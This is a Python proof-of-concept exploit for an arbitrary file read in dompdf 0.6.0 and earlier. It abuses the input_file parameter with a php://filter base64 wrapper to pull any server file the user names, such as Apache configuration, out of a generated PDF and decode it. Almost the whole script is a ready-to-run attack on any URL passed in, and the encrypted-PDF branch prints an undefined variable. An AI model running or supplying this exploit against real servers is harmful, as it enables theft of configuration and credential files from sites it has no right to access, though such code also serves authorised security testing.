#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#########################################################
## POC exploit for <= 0.6.0 dompdf - Arbitrary File Read
#########################################################
## Author: Drew 'farbs' Farber
## Copyright: Copyright 2020, <= 0.6.0 dompdf AFR POC
## License: MIT
#########################################################

import sys
import requests, PyPDF2, io
import base64
import warnings

# Note: UserWarning has been set to 'ignore' due to an occasional trailing whitespace issue during pdf to byte conversion
# Remove the following line to see these errors occur
warnings.filterwarnings("ignore", category=UserWarning)

try:
    url = str(sys.argv[1])
except IndexError:
    print('No URL supplied\nExample: python3 dompdf_poc.py http://example.com')
    exit()        

def makeRequest():

    # Path /dompdf/dompdf.php may need to be adjusted per use case
    # Default path(s): http://example.com/dompdf.php or http://example.com/dompdf/dompdf.php
    
    r = requests.get(url+'/dompdf/dompdf.php', allow_redirects=False) # defaults to /dompdf.php or /dompdf/dompdf.php, both from webroot
    if(r.status_code == 200 or r.status_code == 500): # checks if /dompdf.php is accessible
        # note that the above may occasionally need to be set to 301 or 302 depending on how redirects are handled
        # this is also inclusive for 500 status codes given how some brute forcing techniques cause the server to respond
        #print("Status Code: " + r.status_code)
        readfile = input('Enter file path for retrieval: ') # enter file to read (e.g. /etc/apache2/apache2.conf)
        downfile=requests.get(url+'/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='+readfile)
        raw_data = downfile.content
        pdf_data = io.BytesIO(raw_data)
        pdf_reader = PyPDF2.PdfFileReader(pdf_data)
        if pdf_reader.isEncrypted: # if pdf is auto-encrypted, this will decrypt it before decoding the base64
            pdf_reader.decrypt("") # if you know the password for the pdf file, enter it here
            # the pdf should still be downloadable even with a password, so brute forcing is still an option
            b64 = pdf_reader.getPage(0).extractText().encode('ascii')
            b64output = b64.decode('ascii')
            output = base64.b64decode(b64output)
            byte_output = str(output, 'utf-8')
            formatted_output = byte_output.replace('\\n', '\n')
            print(formattedoutput)
        else:
            b64 = pdf_reader.getPage(0).extractText().encode('ascii') 
            b64output = b64.decode('ascii')
            output = base64.b64decode(b64output)
            byte_output = str(output, 'utf-8')
            formatted_output = byte_output.replace('\\n', '\n')
            print(formatted_output)
        print("File '" + readfile + "' extracted successfully.")   
    elif(r.status_code == 404):
        print("Received 404 Error Code: Did you fat-finger the URL?")
        exit()
    else:
        print("URL: " + url + "Something broke. Exiting...")
        exit()

makeRequest()
